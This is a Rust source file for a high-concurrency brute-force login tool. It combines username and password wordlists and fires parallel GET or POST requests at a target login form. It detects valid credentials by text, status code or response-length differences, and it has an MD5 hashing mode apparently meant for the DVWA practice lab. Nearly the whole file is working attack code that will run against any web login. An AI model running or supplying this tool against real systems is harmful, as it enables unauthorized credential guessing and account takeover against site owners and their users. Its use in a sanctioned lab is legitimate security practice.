// bruteforce.rs - High-performance brute force login module
use reqwest::{Client, cookie::Jar};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::fs::File;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::sync::{Semaphore, RwLock};
use url::Url;

#[derive(Debug, Clone)]
pub enum DetectionMode {
    /// Detect based on presence of success/failure text
    TextBased {
        success_indicator: String,
        failure_indicator: String,
    },
    /// Detect based on HTTP status code differences
    StatusCode {
        success_codes: Vec<u16>,
        failure_codes: Vec<u16>,
    },
    /// Detect based on response length differences (baseline required)
    LengthBased {
        baseline_length: Option<usize>,
        variance_threshold: usize, // Allow some variance
    },
}

#[derive(Debug, Clone)]
pub struct BruteForceConfig {
    pub target_url: String,
    pub username_param: String,
    pub password_param: String,
    pub submit_param: Option<String>,
    pub detection_mode: DetectionMode,
    pub method: HttpMethod,
    pub concurrent_requests: usize,
    pub timeout_secs: u64,
    pub delay_ms: u64,
    pub hash_passwords: bool,
}

#[derive(Debug, Clone)]
pub enum HttpMethod {
    GET,
    POST,
}

impl Default for BruteForceConfig {
    fn default() -> Self {
        Self {
            target_url: String::new(),
            username_param: "username".to_string(),
            password_param: "password".to_string(),
            submit_param: Some("Login".to_string()),
            detection_mode: DetectionMode::LengthBased {
                baseline_length: None,
                variance_threshold: 50,
            },
            method: HttpMethod::GET,
            concurrent_requests: 50,
            timeout_secs: 10,
            delay_ms: 0,
            hash_passwords: false,
        }
    }
}

#[derive(Debug, Clone)]
pub struct Credential {
    pub username: String,
    pub password: String,
}

#[derive(Debug)]
pub struct BruteForceResult {
    pub total_attempts: usize,
    pub successful_logins: Vec<Credential>,
    pub duration_secs: f64,
    pub requests_per_second: f64,
}

pub struct BruteForcer {
    config: BruteForceConfig,
    client: Client,
    successful_creds: Arc<RwLock<Vec<Credential>>>,
    attempts: Arc<RwLock<usize>>,
}

impl BruteForcer {
    pub fn new(config: BruteForceConfig, cookies: Option<Arc<Jar>>) -> Self {
        let client = if let Some(jar) = cookies {
            Client::builder()
                .timeout(Duration::from_secs(config.timeout_secs))
                .cookie_provider(jar)
                .build()
                .unwrap()
        } else {
            Client::builder()
                .timeout(Duration::from_secs(config.timeout_secs))
                .build()
                .unwrap()
        };

        Self {
            config,
            client,
            successful_creds: Arc::new(RwLock::new(Vec::new())),
            attempts: Arc::new(RwLock::new(0)),
        }
    }

    /// Load usernames from file
    pub async fn load_usernames(path: &str) -> Result<Vec<String>, std::io::Error> {
        let file = File::open(path).await?;
        let reader = BufReader::new(file);
        let mut usernames = Vec::new();
        let mut lines = reader.lines();

        while let Some(line) = lines.next_line().await? {
            let username = line.trim().to_string();
            if !username.is_empty() && !username.starts_with('#') {
                usernames.push(username);
            }
        }

        Ok(usernames)
    }

    /// Load passwords from file
    pub async fn load_passwords(path: &str) -> Result<Vec<String>, std::io::Error> {
        let file = File::open(path).await?;
        let reader = BufReader::new(file);
        let mut passwords = Vec::new();
        let mut lines = reader.lines();

        while let Some(line) = lines.next_line().await? {
            let password = line.trim().to_string();
            if !password.is_empty() && !password.starts_with('#') {
                passwords.push(password);
            }
        }

        Ok(passwords)
    }

    /// Generate all username/password combinations
    fn generate_combinations(
        usernames: Vec<String>,
        passwords: Vec<String>,
    ) -> Vec<Credential> {
        let mut combinations = Vec::new();
        for username in &usernames {
            for password in &passwords {
                combinations.push(Credential {
                    username: username.clone(),
                    password: password.clone(),
                });
            }
        }
        combinations
    }

    /// Hash password with MD5 (for DVWA compatibility)
    fn hash_password(password: &str) -> String {
        format!("{:x}", md5::compute(password))
    }

    /// Attempt a single login
    async fn attempt_login(&self, cred: &Credential) -> Result<(bool, usize, u16), reqwest::Error> {
        let password = if self.config.hash_passwords {
            Self::hash_password(&cred.password)
        } else {
            cred.password.clone()
        };

        let response = match self.config.method {
            HttpMethod::GET => {
                let mut url = Url::parse(&self.config.target_url).unwrap();
                url.query_pairs_mut()
                    .append_pair(&self.config.username_param, &cred.username)
                    .append_pair(&self.config.password_param, &password);

                if let Some(ref submit) = self.config.submit_param {
                    url.query_pairs_mut().append_pair(submit, "Login");
                }

                println!("[DEBUG] GET Request URL: {}", url);
                self.client.get(url).send().await?
            }
            HttpMethod::POST => {
                let mut form = vec![
                    (self.config.username_param.clone(), cred.username.clone()),
                    (self.config.password_param.clone(), password),
                ];

                if let Some(ref submit) = self.config.submit_param {
                    form.push((submit.clone(), "Login".to_string()));
                }

                println!("[DEBUG] POST Request to: {} with data: {:?}", self.config.target_url, form);
                self.client
                    .post(&self.config.target_url)
                    .form(&form)
                    .send()
                    .await?
            }
        };

        let status = response.status().as_u16();
        let body = response.text().await?;
        let body_length = body.len();

        println!("[DEBUG] Testing {}:{} - Status: {} - Body length: {} bytes",
                 cred.username, cred.password, status, body_length);

        // Save first response to file for debugging
        static FIRST_SAVE: std::sync::Once = std::sync::Once::new();
        FIRST_SAVE.call_once(|| {
            if let Err(e) = std::fs::write("debug_response.html", &body) {
                eprintln!("[WARN] Could not save debug response: {}", e);
            } else {
                println!("[DEBUG] Saved first response to debug_response.html for inspection");
            }
        });

        // Show a snippet of the response for first few attempts
        if body.len() < 1000 {
            println!("[DEBUG] Response preview: {}", body);
        } else {
            println!("[DEBUG] Response preview (first 500 chars): {}...", &body[..500]);
            println!("[DEBUG] Response preview (last 500 chars): ...{}", &body[body.len()-500..]);
        }

        // Determine success based on detection mode
        let is_success = match &self.config.detection_mode {
            DetectionMode::TextBased { success_indicator, failure_indicator } => {
                let has_success = body.contains(success_indicator);
                let has_failure = body.contains(failure_indicator);

                println!("[DEBUG] Contains success indicator '{}': {}", success_indicator, has_success);
                println!("[DEBUG] Contains failure indicator '{}': {}", failure_indicator, has_failure);

                if has_success {
                    true
                } else if has_failure {
                    false
                } else {
                    println!("[WARN] Ambiguous response - neither success nor failure indicator found!");
                    println!("[WARN] You may need to adjust --success-text or --failure-text");
                    false
                }
            }
            DetectionMode::StatusCode { success_codes, failure_codes } => {
                println!("[DEBUG] Status code: {}", status);
                if success_codes.contains(&status) {
                    println!("[DEBUG] Matches success status code!");
                    true
                } else if failure_codes.contains(&status) {
                    println!("[DEBUG] Matches failure status code");
                    false
                } else {
                    println!("[WARN] Status code {} doesn't match success or failure codes", status);
                    false
                }
            }
            DetectionMode::LengthBased { baseline_length, variance_threshold } => {
                if let Some(baseline) = baseline_length {
                    let diff = (body_length as i32 - *baseline as i32).abs() as usize;
                    let is_different = diff > *variance_threshold;
                    println!("[DEBUG] Length: {} vs baseline: {} (diff: {}, threshold: {})",
                             body_length, baseline, diff, variance_threshold);
                    if is_different {
                        println!("[DEBUG] ⚠️  Significant length difference detected - possible success!");
                    }
                    is_different
                } else {
                    // First attempt - this becomes the baseline
                    println!("[DEBUG] Setting baseline length: {} bytes", body_length);
                    false
                }
            }
        };

        Ok((is_success, body_length, status))
    }

    /// Run brute force attack
    pub async fn attack(
        mut self,
        usernames: Vec<String>,
        passwords: Vec<String>,
    ) -> BruteForceResult {
        let start_time = Instant::now();
        let combinations = Self::generate_combinations(usernames.clone(), passwords.clone());
        let total = combinations.len();

        println!("[*] Starting brute force attack");
        println!("[*] Target: {}", self.config.target_url);
        println!("[*] Total combinations: {}", total);
        println!("[*] Usernames: {}", usernames.len());
        println!("[*] Passwords: {}", passwords.len());
        println!("[*] Concurrent requests: {}", self.config.concurrent_requests);
        println!("[*] Method: {:?}", self.config.method);
        match &self.config.detection_mode {
            DetectionMode::TextBased { success_indicator, failure_indicator } => {
                println!("[*] Detection: Text-based");
                println!("[*] Success indicator: '{}'", success_indicator);
                println!("[*] Failure indicator: '{}'", failure_indicator);
            }
            DetectionMode::StatusCode { success_codes, failure_codes } => {
                println!("[*] Detection: Status code");
                println!("[*] Success codes: {:?}", success_codes);
                println!("[*] Failure codes: {:?}", failure_codes);
            }
            DetectionMode::LengthBased { variance_threshold, .. } => {
                println!("[*] Detection: Response length (auto-baseline)");
                println!("[*] Variance threshold: {} bytes", variance_threshold);
            }
        }
        if self.config.hash_passwords {
            println!("[*] Password hashing: MD5 (DVWA mode)");
        }
        println!();

        println!("[DEBUG] Testing first combination to verify setup...");
        if let Some(first_cred) = combinations.first() {
            println!("[DEBUG] First test: username='{}' password='{}'",
                     first_cred.username, first_cred.password);

            // Establish baseline for length-based detection
            match &self.config.detection_mode {
                DetectionMode::LengthBased { baseline_length, .. } => {
                    if baseline_length.is_none() {
                        match self.attempt_login(first_cred).await {
                            Ok((_, length, _)) => {
                                // Update the baseline in config
                                if let DetectionMode::LengthBased { baseline_length, variance_threshold } = &mut self.config.detection_mode {
                                    *baseline_length = Some(length);
                                    println!("[*] Baseline established: {} bytes (failed login)", length);
                                    println!("[*] Will detect successes as responses differing by more than {} bytes\n", variance_threshold);
                                }
                            }
                            Err(e) => {
                                eprintln!("[!] Failed to establish baseline: {}", e);
                            }
                        }
                    }
                }
                _ => {}
            }
        }
        println!();

        // Semaphore to limit concurrent requests
        let semaphore = Arc::new(Semaphore::new(self.config.concurrent_requests));
        let mut tasks = Vec::new();

        for cred in combinations.into_iter() {
            let sem = semaphore.clone();
            let bruteforcer = self.clone();
            let successful_creds = self.successful_creds.clone();
            let attempts = self.attempts.clone();

            let task = tokio::spawn(async move {
                let _permit = sem.acquire().await.unwrap();

                // Optional delay between requests
                if bruteforcer.config.delay_ms > 0 {
                    tokio::time::sleep(Duration::from_millis(bruteforcer.config.delay_ms)).await;
                }

                match bruteforcer.attempt_login(&cred).await {
                    Ok((true, _, _)) => {
                        println!(
                            "\n[+] ✓✓✓ SUCCESS! Username: '{}' Password: '{}' ✓✓✓\n",
                            cred.username, cred.password
                        );
                        let mut creds = successful_creds.write().await;
                        creds.push(cred);
                    }
                    Ok((false, _, _)) => {
                        // Failed login - show occasional progress
                    }
                    Err(e) => {
                        eprintln!("[!] Error testing {}:{} - {}", cred.username, cred.password, e);
                    }
                }

                // Update progress
                let mut count = attempts.write().await;
                *count += 1;
                if *count % 10 == 0 || *count == total {
                    let elapsed = start_time.elapsed().as_secs_f64();
                    let rate = *count as f64 / elapsed;
                    println!(
                        "[*] Progress: {}/{} ({:.1}%) - {:.0} req/s",
                        *count,
                        total,
                        (*count as f64 / total as f64) * 100.0,
                        rate
                    );
                }
            });

            tasks.push(task);
        }

        // Wait for all tasks to complete
        for task in tasks {
            let _ = task.await;
        }

        let duration = start_time.elapsed().as_secs_f64();
        let successful_logins = self.successful_creds.read().await.clone();
        let total_attempts = *self.attempts.read().await;

        println!();
        println!("[*] Attack completed!");
        println!("[*] Duration: {:.2} seconds", duration);
        println!("[*] Total attempts: {}", total_attempts);
        println!("[*] Requests per second: {:.0}", total_attempts as f64 / duration);
        println!("[*] Successful logins: {}", successful_logins.len());

        if !successful_logins.is_empty() {
            println!("\n[+] Valid credentials found:");
            for cred in &successful_logins {
                println!("    Username: '{}' Password: '{}'", cred.username, cred.password);
            }
        } else {
            println!("\n[-] No valid credentials found.");
            println!("    Check the debug output above to verify:");
            println!("    - Target URL is correct");
            println!("    - Success/failure indicators match the response");
            println!("    - Cookies are valid (if required)");
        }

        BruteForceResult {
            total_attempts,
            successful_logins,
            duration_secs: duration,
            requests_per_second: total_attempts as f64 / duration,
        }
    }
}

impl Clone for BruteForcer {
    fn clone(&self) -> Self {
        Self {
            config: self.config.clone(),
            client: self.client.clone(),
            successful_creds: self.successful_creds.clone(),
            attempts: self.attempts.clone(),
        }
    }
}